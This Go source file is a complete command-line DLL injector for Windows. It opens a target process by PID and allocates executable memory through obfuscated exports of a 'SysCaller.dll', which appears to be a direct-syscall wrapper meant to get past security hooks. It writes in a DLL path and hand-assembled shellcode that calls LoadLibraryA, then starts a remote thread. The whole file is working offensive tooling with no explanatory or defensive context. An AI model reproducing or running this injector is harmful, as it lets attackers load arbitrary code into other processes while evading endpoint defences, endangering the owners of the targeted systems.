package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	modSysCaller         = syscall.NewLazyDLL("SysCaller.dll")
	procAllocate         = modSysCaller.NewProc("oznbvo_655212")
	procWrite            = modSysCaller.NewProc("yexedj_555900")
	procThread           = modSysCaller.NewProc("jljtug_682236")
	procClose            = modSysCaller.NewProc("ezhgwv_592746")
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess      = kernel32.NewProc("OpenProcess")
	procWaitForSingleObj = kernel32.NewProc("WaitForSingleObject")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	THREAD_ALL_ACCESS      = 0x1FFFFF
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

func NT_SUCCESS(status uintptr) bool {
	return int32(status) >= 0
}

func InjectDLL(process syscall.Handle, dllPath string) bool {
	absPath, _ := syscall.FullPath(dllPath)
	pathBytes := append([]byte(absPath), 0)
	pathLen := uintptr(len(pathBytes))
	var baseAddr uintptr
	regionSize := pathLen
	// Allocate memory for DLL path
	status, _, _ := procAllocate.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
		0,
		0,
	)
	if !NT_SUCCESS(status) {
		fmt.Printf("[!] Failed to allocate memory. Status: 0x%X\n", status)
		return false
	}
	fmt.Printf("[+] Allocated DLL path memory at: 0x%X\n", baseAddr)
	// Write DLL path
	var bytesWritten uintptr
	status, _, _ = procWrite.Call(
		uintptr(process),
		baseAddr,
		uintptr(unsafe.Pointer(&pathBytes[0])),
		pathLen,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if !NT_SUCCESS(status) || bytesWritten != pathLen {
		fmt.Printf("[!] Failed to write DLL path. Status: 0x%X\n", status)
		return false
	}
	fmt.Println("[+] Successfully wrote DLL path")
	// Get LoadLibraryA address
	k32 := syscall.NewLazyDLL("kernel32.dll")
	loadlib := k32.NewProc("LoadLibraryA")
	loadlibAddr := loadlib.Addr()
	fmt.Printf("[+] LoadLibraryA address: 0x%X\n", loadlibAddr)
	// Shellcode to call LoadLibraryA with DLL path
	shellcode := make([]byte, 0)
	shellcode = append(shellcode, []byte{0x48, 0x83, 0xEC, 0x28}...) // sub rsp, 0x28
	shellcode = append(shellcode, 0x48, 0xB9)                        // mov rcx,
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(baseAddr))
	shellcode = append(shellcode, buf...)     // DLL path addr
	shellcode = append(shellcode, 0x48, 0xB8) // mov rax,
	binary.LittleEndian.PutUint64(buf, uint64(loadlibAddr))
	shellcode = append(shellcode, buf...)                            // LoadLibraryA addr
	shellcode = append(shellcode, []byte{0xFF, 0xD0}...)             // call rax
	shellcode = append(shellcode, []byte{0x48, 0x83, 0xC4, 0x28}...) // add rsp, 0x28
	shellcode = append(shellcode, 0xC3)                              // ret
	var shellAddr uintptr
	regionSize = uintptr(len(shellcode))
	// Allocate memory for shellcode
	status, _, _ = procAllocate.Call(
		uintptr(process),
		uintptr(unsafe.Pointer(&shellAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
		0,
		0,
	)
	if !NT_SUCCESS(status) {
		fmt.Printf("[!] Failed to allocate shellcode. Status: 0x%X\n", status)
		return false
	}
	fmt.Printf("[+] Allocated shellcode memory at: 0x%X\n", shellAddr)
	// Write shellcode
	status, _, _ = procWrite.Call(
		uintptr(process),
		shellAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if !NT_SUCCESS(status) || bytesWritten != uintptr(len(shellcode)) {
		fmt.Printf("[!] Failed to write shellcode. Status: 0x%X\n", status)
		return false
	}
	fmt.Println("[+] Successfully wrote shellcode")
	// Create remote thread
	var hThread uintptr
	status, _, _ = procThread.Call(
		uintptr(unsafe.Pointer(&hThread)),
		THREAD_ALL_ACCESS,
		0,
		uintptr(process),
		shellAddr,
		0,
		0, 0, 0, 0,
		0,
	)
	if !NT_SUCCESS(status) || hThread == 0 {
		fmt.Printf("[!] Failed to create remote thread. Status: 0x%X\n", status)
		return false
	}
	fmt.Printf("[+] Created remote thread: 0x%X\n", hThread)
	// Wait + Close
	procWaitForSingleObj.Call(hThread, 5000)
	procClose.Call(hThread)

	fmt.Printf("[+] Successfully injected %s!\n", dllPath)
	return true
}

func main() {
	if len(os.Args) != 3 {
		fmt.Printf("Usage: %s <pid> <dll_path>\n", os.Args[0])
		return
	}
	pid := uint32(0)
	fmt.Sscanf(os.Args[1], "%d", &pid)
	dll := os.Args[2]
	ret, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if ret == 0 {
		fmt.Printf("[!] Failed to open process %d\n", pid)
		return
	}
	handle := syscall.Handle(ret)
	InjectDLL(handle, dll)
	procClose.Call(uintptr(handle))
}
